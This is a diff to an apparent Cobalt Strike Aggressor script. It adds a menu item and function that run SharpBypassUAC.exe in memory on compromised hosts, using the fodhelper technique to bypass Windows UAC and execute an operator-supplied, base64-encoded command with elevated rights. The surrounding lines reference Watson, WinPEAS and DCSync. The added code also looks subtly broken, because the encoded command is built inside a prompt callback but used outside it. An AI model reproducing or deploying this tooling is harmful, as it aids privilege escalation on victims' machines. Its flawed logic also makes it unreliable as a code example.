@@ -180,6 +180,18 @@ item "Run Watson to find missing patches  - T1082"{
 
 #################################################
 
+#   SharpBypassUAC
+
+#################################################
+item "fodhelper"{
+            local('$bid');
+                foreach $bid ($1){
+                    uacfodhelper($bid);
+                }
+            }	
+	    
+#################################################
+
 #   Run WinPEAS to find Privilege Escalation
 
 #################################################
@@ -490,6 +502,18 @@ sub mass-dcsync {
 
 }
 
+#################################################
+
+#   SharpBypassUAC
+
+#################################################
+
+sub uacfodhelper{ 
+prompt_text("Enter A Command:", "", lambda({ 
+$b64 = base64_encode("$1")
+}))
+bexecute_assembly($1, script_resource('exe/SharpBypassUAC.exe'),"-b fodhelper -e $b64"); 
+}
 
 #################################################
 
